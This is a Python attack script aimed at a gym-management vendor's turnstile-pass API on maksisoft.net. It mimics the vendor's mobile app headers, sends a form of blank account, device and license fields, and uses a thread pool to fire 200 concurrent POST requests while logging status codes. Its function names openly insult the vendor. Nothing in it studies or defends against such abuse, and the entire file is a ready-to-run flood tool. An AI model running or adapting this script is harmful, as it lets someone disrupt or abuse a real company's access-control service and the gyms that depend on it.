import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

init(autoreset=True)

url = "https://(salonkodu).maksisoft.net/extra/mobile/turnikegecis"

data = {
    "cpaccount": "",
    "userid": "",
    "deviceid": "",
    "serverUrl": "",
    "qrlicense": "",
    "uniqId": "",
    "raspberrySerial": "",
    "justresult": "1"
}

headers = {
    "accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "fitclubizmir.maksisoft.net",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.9.1"
}
session = requests.Session()
def fuckoffmaksisoft(hah):
    try:
        response = session.post(url, headers=headers, data=data)
        if response.status_code == 200:
            print(Fore.GREEN + f"[{hah}] Status Code: {response.status_code}")
        else:
            print(Fore.RED + f"[{hah}] Status Code: {response.status_code}")
    except Exception as e:
        print(Fore.YELLOW + f"[{hah}] {e}")

def fuckoffmaksisoft1(thread_count):
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        executor.map(fuckoffmaksisoft, range(1, thread_count + 1))

fuckoffmaksisoft1(200) 
